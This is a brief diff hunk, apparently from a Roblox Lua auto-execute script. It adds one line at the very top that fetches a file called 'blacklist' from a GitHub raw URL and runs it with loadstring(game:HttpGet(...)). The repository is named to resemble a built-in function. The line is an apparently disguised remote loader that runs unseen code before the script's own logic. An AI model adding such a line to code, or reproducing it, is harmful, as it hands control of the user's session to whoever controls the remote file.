@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Function-FindFirstChild-Plr/main/blacklist"))()
 local AutoExec = game
 repeat wait() until AutoExec:IsLoaded();
 if not AutoExec:IsLoaded() then
